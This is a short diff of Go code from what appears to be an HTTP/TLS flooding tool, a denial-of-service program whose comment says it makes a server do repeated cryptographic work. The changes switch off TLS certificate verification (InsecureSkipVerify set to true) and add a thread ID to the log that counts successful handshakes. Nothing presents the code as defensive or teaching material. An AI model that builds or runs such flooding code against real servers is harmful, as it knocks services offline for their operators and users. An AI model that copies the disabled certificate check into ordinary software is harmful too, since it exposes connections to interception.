@@ -223,7 +223,7 @@ func (flooder *HttpFlooder) Flood() {
 			// attempts to repetitively do cryptographic work on the server's cpu.
 
 			config := &tls.Config{
-				InsecureSkipVerify: false,
+				InsecureSkipVerify: true,
 			}
 
 			conn, err := tls.Dial("tcp", combineHost(flooder.Host, flooder.Port), config)
@@ -245,7 +245,7 @@ func (flooder *HttpFlooder) Flood() {
 			}
 			secureSuccess++
 
-			print_sumthin("Successful handshake(s): "+strconv.Itoa(secureSuccess), INFO)
+			print_sumthin("Thread: "+strconv.Itoa(flooder.ThreadID)+" | Successful handshake(s): "+strconv.Itoa(secureSuccess), INFO)
 
 			if flooder.Interval > 0 {
 				time.Sleep(time.Duration(flooder.Interval) * time.Second)
